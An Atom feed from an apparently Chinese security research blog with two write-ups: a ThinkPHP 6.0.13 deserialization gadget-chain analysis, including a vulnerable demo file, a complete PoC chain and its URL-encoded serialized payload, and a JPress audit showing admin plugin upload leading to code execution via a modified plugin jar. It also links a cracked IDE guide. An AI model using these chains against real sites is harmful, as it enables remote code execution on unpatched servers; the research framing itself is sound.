<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>卡卡罗特取西经</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-04-22T12:13:52.660Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>ybdt</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ThinkPHP最新版6-0-13-0day利用链分析</title>
    <link href="http://example.com/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-04-22T11:53:08.000Z</published>
    <updated>2024-04-22T12:13:52.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-ThinkPHP版本梳理"><a href="#0x01-ThinkPHP版本梳理" class="headerlink" title="0x01 ThinkPHP版本梳理"></a>0x01 ThinkPHP版本梳理</h1><p>截止到2022年10月17日<br>6.0.x系列最新版是V6.0.13（2022年07月15日发布）<br>5.1.x系列最新版是V5.1.41（2021年01月12日发布）<br>5.0.x系列最新版是V5.0.24（2019年01月11日发布）  </p><p>作者在2019年02月14日发布V5.2 RC1后，没有再发布过V5.2系列，而是在2019年04月22日发布V6.0.0 RC2，看样子V6.0系列接替了V5.2系列</p><p>thinkphp6及以上，安装需要使用composer</p><h1 id="0x02-Mac下PHP集成环境踩坑"><a href="#0x02-Mac下PHP集成环境踩坑" class="headerlink" title="0x02 Mac下PHP集成环境踩坑"></a>0x02 Mac下PHP集成环境踩坑</h1><p>php集成环境，之前在windows下用phpstudy，自从换了mac，什么都要重新来。。</p><p>首选使用破解版MAMP Pro，但我这边下载后安装报错（后经查阅，安装破解版MAMP Pro可能需要关闭SIP，SIP即macOS的一种保护机制），不想关闭SIP，放弃这个方案，也试过MAMP免费版，但不支持切换php版本，这个不能忍，尝试phpstudy mac版，发现phpstudy mac版支持切换php版本，其他功能界面也和phpstudy windows版基本一致，就用它了</p><p>具体使用phpstudy mac版后发现，启动phpstudy mac版内置的php解释器报错，提示找不到redis.so库，在php.ini中注释掉redis.so库可解决此提醒，but，使用phpstudy内置的php下载composer时又报错，提示缺少openssl库，此时需要自己编译openssl库，太麻烦了，干脆换一个php集成环境吧，找来找去，发现MAMP免费版也可以切换php版本（需要一个小技巧，后面会提到），下载后尝试用内置的php下载安装composer，成功安装composer，OK，就用它了</p><p>mamp免费版切换php版本技巧，进入mamp下php安装目录，由于mamp默认会不显示后面加_x的版本，所以可将其他版本改个名字来切换版本，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221019105719682.png" alt="image-20221019105719682"></p><h1 id="0x03-Mac下ThinkPHP调试环境踩坑"><a href="#0x03-Mac下ThinkPHP调试环境踩坑" class="headerlink" title="0x03 Mac下ThinkPHP调试环境踩坑"></a>0x03 Mac下ThinkPHP调试环境踩坑</h1><p>php开发环境，使用phpstorm 2021.1.4，破解方式参考：<a href="https://github.com/ybdt/pentest-hub/tree/main/%E5%A6%82%E4%BD%95%E6%94%BE%E5%BF%83%E7%9A%84%E7%99%BD%E5%AB%96%E5%9B%9B%E5%A4%A7%E4%B8%BB%E6%B5%81%E8%AF%AD%E8%A8%80IDE">https://github.com/ybdt/pentest-hub/tree/main/如何放心的白嫖四大主流语言IDE</a></p><p>安装composer，参考：<a href="https://getcomposer.org/download/">https://getcomposer.org/download/</a></p><p>在mamp的对应php目录下安装composer，然后创建到/usr/local/bin的软连接，创建软连接后，可从任意位置执行composer及php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /Applications/MAMP/bin/php/php7.1.33/bin/composer.phar /usr/local/bin/composer</span><br><span class="line"></span><br><span class="line">ln -s /Applications/MAMP/bin/php/php7.1.33/bin/php /usr/local/bin/php</span><br></pre></td></tr></table></figure><p>安装指定版本的thinkphp框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp5.0 5.0.24</span><br></pre></td></tr></table></figure><p>我这边composer版本是2.2.18，不是最新版2.4.3，想使用composer安装thinkphp6的最新版6.0.13会提示找不到，可是php7.1安装composer最高版本只能是2.2.18，于是改用php7.4安装composer，成功安装到composer 2.4.3，再用composer 2.4.3安装thinkphp 6.0.13，成功安装，真是一波三折，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221019155233012.png" alt="image-20221019155233012"></p><p>然后是php调试环境，mac下想安装xdebug需要先通过homebrew安装php，然后通过pecl安装xdebug，可是这样只能安装php版本对应的xdebug，不能安装指定版本的xdebug，有点烦~</p><p>可从<a href="%5Bhttps://xdebug.org/wizard">https://xdebug.org/wizard</a>中查询当前php版本需要哪个版本的xdebug，结果按照指令安装的时候，发现缺少phpize，官方文档并没有讲述mac下缺少phpize该如何安装，google后发现可能需要编译安装，太麻烦了，想想别的办法，猛地发现，mamp的如下目录自带了编译好的xdebug</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/bin/php/php7.4.21/lib/php/extensions/no-debug-non-zts-20190902</span><br></pre></td></tr></table></figure><p>不得不说，集成环境真香~</p><p>修改php.ini，增加如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=&quot;/Applications/MAMP/bin/php/php7.4.21/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so&quot;</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.remote_autostart=on</span><br><span class="line">xdebug.remote_log=&quot;/var/log/xdebug.log&quot;</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line">xdebug.idekey=&quot;PhpStorm&quot;</span><br></pre></td></tr></table></figure><p>成功安装了xdebug，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020001654994.png" alt="image-20221020001654994"></p><p>Phpstorm配置过程参见：<a href="https://juejin.cn/post/6934614190548221960">https://juejin.cn/post/6934614190548221960</a></p><p>配置好后，如下图启动<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020094716570.png" alt="image-20221020095242692"></p><p>能看到网页访问停在了断点处<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020094821384.png" alt="image-20221020094821384"></p><p>程序执行停在了断点处<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020095242692.png" alt="image-20221020095242692"></p><h1 id="0x04-PHP反序列化漏洞及POP链复习"><a href="#0x04-PHP反序列化漏洞及POP链复习" class="headerlink" title="0x04 PHP反序列化漏洞及POP链复习"></a>0x04 PHP反序列化漏洞及POP链复习</h1><p>PHP反序列化漏洞原理：服务端在处理用户传入的序列化数据时，需要调用unserialize()，php中调用unserialize()会触发魔法方法<code>__wakekup()</code>、<code>__destruct()</code>，如果魔法方法中包含了危险函数或间接包含危险函数，则攻击者可构造恶意的序列化数据，在服务端反序列化的时候造成危险函数的执行，</p><p>PHP反序列化POP链原理：由于类反序列化后只包含属性不包含方法，也就是说我们构造的序列化数据只能操纵类的属性，不能操纵方法，只能通过自动调用魔法方法来调用方法，这个时候如果魔法方法中不是直接包含危险函数，就需要向上回溯，一层一层跟踪，也就是所谓的POP链，通常是寻找包含危险函数的同名方法、或者更复杂的，触发各种魔法方法，最终调用危险函数</p><p>详细讲解可参考：<br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://johnfrod.top/安全/php反序列化漏洞总结/</a><br><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">https://www.cnblogs.com/bmjoker/p/13742666.html</a></p><p>如下是一个存在反序列化漏洞的文件vuln1.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Demo &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    </span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new L();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class L &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;function action() in class L&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    </span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">unserialize($_GET[&#x27;test&#x27;]);</span><br></pre></td></tr></table></figure><p>由上述Demo可知，如果构造一个Demo类，里面实例化的是类Evil，反序列化时自动调用<code>__destruct()</code>，<code>__destruct()</code>中调用action()，action()中调用危险函数eval，则最终导致代码执行，同时不要忘记将恶意代码赋值给$test2，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Demo &#123;</span><br><span class="line">    var $test;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new Evil();</span><br><span class="line">        $this-&gt;test-&gt;test2 = &quot;phpinfo();&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line"></span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = new demo();</span><br><span class="line">$data = serialize($d);</span><br><span class="line">echo $data;</span><br><span class="line"></span><br><span class="line">//上述输出</span><br><span class="line">//O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;test&quot;;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>将上述序列化的输出传给vuln1.php，执行结果如下图</p><p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021113505973.png" alt="image-20221021113505973"></p><h1 id="0x05-ThinkPHP框架复习"><a href="#0x05-ThinkPHP框架复习" class="headerlink" title="0x05 ThinkPHP框架复习"></a>0x05 ThinkPHP框架复习</h1><p>网站搭建好后，我们会访问：<a href="http://localhost:8888/tp6.0.13/public/index.php">http://localhost:8888/tp6.0.13/public/index.php</a>，其实这里的index.php并不是访问的内容，而是一个类似路由的文件，会请求分发到app/controller/Index.php中的方法index，可以看到其内容也是首页中出现的内容<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021151524589.png" alt="image-20221021151524589"></p><p>我们对方法index做个修改<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021151908240.png" alt="image-20221021151908240"></p><p>可以看到，首页内容也发生了修改<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021151946085.png" alt="image-20221021151946085"></p><p>其实访问 <a href="http://localhost:8888/tp6.0.13/public/index.php">http://localhost:8888/tp6.0.13/public/index.php</a> 相当于访问 <a href="http://localhost:8888/tp6.0.13/public/index.php/Index/index">http://localhost:8888/tp6.0.13/public/index.php/Index/index</a> ，只不过不加的时候，类Index和方法index是作为默认值，如果要访问其他方法，改为其他方法即可</p><p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021152514296.png" alt="image-20221021152514296"></p><p>详细讲解可参考：<br><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037485">https://www.kancloud.cn/manual/thinkphp6_0/1037485</a><br><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037494">https://www.kancloud.cn/manual/thinkphp6_0/1037494</a></p><h1 id="0x06-ThinkPHP最新版6-0-13-0day利用链分析"><a href="#0x06-ThinkPHP最新版6-0-13-0day利用链分析" class="headerlink" title="0x06 ThinkPHP最新版6.0.13 0day利用链分析"></a>0x06 ThinkPHP最新版6.0.13 0day利用链分析</h1><p>截止到2022年10月17日，thinkphp 6.0.x系列最新版是V6.0.13（2022年07月15日发布），08月14日有人提交了一个反序列化利用链，是一个目前尚未修复的0day，下面对它进行一波分析</p><p>先用如下poc打一遍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">namespace League\Flysystem\Cached\Storage&#123;</span><br><span class="line">    class Psr6Cache&#123;</span><br><span class="line">          private $pool;</span><br><span class="line">          protected $autosave = false;</span><br><span class="line">          public function __construct($exp)</span><br><span class="line">&#123;</span><br><span class="line">              $this-&gt;pool = $exp;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\log&#123;</span><br><span class="line">      class Channel&#123;</span><br><span class="line">          protected $logger;</span><br><span class="line">          protected $lazy = true;</span><br><span class="line">          public function __construct($exp)</span><br><span class="line">&#123;</span><br><span class="line">               $this-&gt;logger = $exp;</span><br><span class="line">               $this-&gt;lazy = false;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think&#123;</span><br><span class="line">      class Request&#123;</span><br><span class="line">          protected $url;</span><br><span class="line">          public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">              $this-&gt;url = &#x27;&lt;?php phpinfo(); ?&gt;&#x27;;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      class App&#123;</span><br><span class="line">            protected $instances = [];</span><br><span class="line">            public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">                $this-&gt;instances = [&#x27;think\Request&#x27;=&gt;new Request()];</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\view\driver&#123;</span><br><span class="line">      class Php&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\log\driver&#123;</span><br><span class="line">      class Socket&#123;</span><br><span class="line">            protected $config = [];</span><br><span class="line">            protected $app;</span><br><span class="line">            protected $clientArg = [];</span><br><span class="line">            public function __construct()</span><br><span class="line">            &#123;</span><br><span class="line">               $this-&gt;config = [</span><br><span class="line">                  &#x27;debug&#x27;=&gt;true,</span><br><span class="line">                  &#x27;force_client_ids&#x27; =&gt; 1,</span><br><span class="line">                  &#x27;allow_client_ids&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">                  &#x27;format_head&#x27; =&gt; [new \think\view\driver\Php,&#x27;display&#x27;], # 利用类和方法</span><br><span class="line">               ];</span><br><span class="line">               $this-&gt;app = new \think\App();</span><br><span class="line">               $this-&gt;clientArg = [&#x27;tabid&#x27;=&gt;&#x27;1&#x27;];</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $c = new think\log\driver\Socket();</span><br><span class="line">    $b = new think\log\Channel($c);</span><br><span class="line">    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);</span><br><span class="line">    echo urlencode(serialize($a));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//输出如下</span><br><span class="line">O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A2%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A17%3A%22think%5Clog%5CChannel%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00logger%22%3BO%3A23%3A%22think%5Clog%5Cdriver%5CSocket%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A4%3A%7Bs%3A5%3A%22debug%22%3Bb%3A1%3Bs%3A16%3A%22force_client_ids%22%3Bi%3A1%3Bs%3A16%3A%22allow_client_ids%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22format_head%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A9%3A%22think%5CApp%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A13%3A%22think%5CRequest%22%3BO%3A13%3A%22think%5CRequest%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A12%3A%22%00%2A%00clientArg%22%3Ba%3A1%3A%7Bs%3A5%3A%22tabid%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A7%3A%22%00%2A%00lazy%22%3Bb%3A0%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3B%7D</span><br></pre></td></tr></table></figure><p>传入payload，如下图</p><p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021170119781.png" alt="image-20221021170119781"></p><p>根据poc可以看到漏洞代码出现在</p><p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021161431399.png" alt="image-20221021161431399"></p><p>这种框架向上回溯太麻烦了，采用poc+动态debug进行分析，基于之前的thinkphp框架复习，我们在vuln方法中加入漏洞代码，并在反序列化处打上断点，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021170414934.png" alt="image-20221021170414934"></p><p>此处是反序列化入口__destruct()，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221022110935817.png" alt="image-20221022110935817"></p><p>一步一步跟进，跟进到下图所示的语句，可以看到此时autosave值为false，进入save()<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021163201653.png" alt="image-20221021163201653"></p><p>继续跟踪，最终跟到触达代码执行的地方<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021174538053.png" alt="image-20221021174538053"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-ThinkPHP版本梳理&quot;&gt;&lt;a href=&quot;#0x01-ThinkPHP版本梳理&quot; class=&quot;headerlink&quot; title=&quot;0x01 ThinkPHP版本梳理&quot;&gt;&lt;/a&gt;0x01 ThinkPHP版本梳理&lt;/h1&gt;&lt;p&gt;截止到2022年10</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>JPress审计</title>
    <link href="http://example.com/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/</id>
    <published>2024-04-22T11:28:19.000Z</published>
    <updated>2024-04-22T11:37:33.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-目标熟悉"><a href="#0x01-目标熟悉" class="headerlink" title="0x01 目标熟悉"></a>0x01 目标熟悉</h1><p>JPress 是一个使用 Java 开发的、开源免费的建站神器，灵感来源于 WordPress，目前已经有超过 10w+ 的网站使用 JPress 搭建，其中包括多个政府机构，200+上市公司，中科院、红十字会等。</p><p>JPress基于JBoot而不是SpringBoot</p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>依照官方文档：<a href="http://doc.jpress.cn/manual/start.html">http://doc.jpress.cn/manual/start.html</a></p><p>下载项目并解压到指定目录下</p><p>配置好java环境，可参考：<a href="http://doc.jpress.cn/manual/jdk_config.html">http://doc.jpress.cn/manual/jdk_config.html</a></p><p>配置好maven环境，可参考：<a href="http://doc.jpress.cn/manual/maven_config.html">http://doc.jpress.cn/manual/maven_config.html</a></p><p>这里有一个小问题，maven切换到阿里云的源后，执行mvn help:system会报错，暂时使用官方源</p><p>配置好IDEA开发环境，可参考：<a href="http://doc.jpress.cn/manual/idea_environment_config.html">http://doc.jpress.cn/manual/idea_environment_config.html</a></p><p>maven不了解的，可参考：<a href="https://www.cnblogs.com/lenve/p/12047793.html">https://www.cnblogs.com/lenve/p/12047793.html</a></p><p>可通过如下命令启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd jpress</span><br><span class="line">mvn clean package</span><br><span class="line">cd starter/target/starter-4.0</span><br><span class="line">./jpress.sh start</span><br></pre></td></tr></table></figure><p>也可通过IDEA启动，配置好IDEA开发环境后，依照文档定位到文件starter/src/main/java/io.jpress/Starter，点击启动方法main，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221226153949475.png" alt="image-20221226153949475"></p><p>成功启动，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221226154120204.png" alt="image-20221226154120204"></p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221220104411543.png" alt="image-20221220104411543"></p><p>访问127.0.0.1:8080进入安装界面，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221220104649641.png" alt="image-20221220104649641"></p><p>一路下一步，依照提示操作即可，成功搭建后，使用内网ip访问，前台界面如下</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221226154312930.png" alt="image-20221226154312930"></p><p>后台界面如下</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221226154626800.png" alt="image-20221226154626800"></p><p>在 starter/src/main/resources/undertow.txt 中可以修改端口</p><h1 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h1><h2 id="01-通杀最新版的后台插件上传getshell"><a href="#01-通杀最新版的后台插件上传getshell" class="headerlink" title="01 通杀最新版的后台插件上传getshell"></a>01 通杀最新版的后台插件上传getshell</h2><p>登录后台后，查看后台功能，在插件-&gt;安装可以看到能安装插件，想到将恶意代码放入插件中，然后上传插件getshell，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227141058166.png" alt="image-20221227141058166"></p><p>开始动手，首先查看项目目录，能大概猜到，插件目录是jpress-addons，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227154325574.png" alt="image-20221227154325574"></p><p>展开项目，我们修改jpress-addon-helloworld子项目，可以看到HelloWorldAddon这个文件负责：安装、卸载、启动、停止时触发的动作，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227154904932.png" alt="image-20221227154904932"></p><p>HelloWorldAddonController这个文件负责访问某些路径时触发的动作，我们选择在方法adminmenutest()中添加如下恶意代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加后如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227155336903.png" alt="image-20221227155336903"></p><p>然后我们将项目jpress-addon-helloworld打包成jar包，我这边进入jpress-addon-helloworld子目录后执行mvn clean package会打包失败，需要进入根目录执行mvn clean package，执行后如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227155830016.png" alt="image-20221227155830016"></p><p>然后在jpress-addon-helloworld的target目录下找到jpress-addon-helloworld-4.0.jar，登录后台，在插件处上传jpress-addon-helloworld-4.0.jar，然后点击插件测试，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227160221062.png" alt="image-20221227160221062"></p><p>可以看到成功弹出计算器</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227160017106.png" 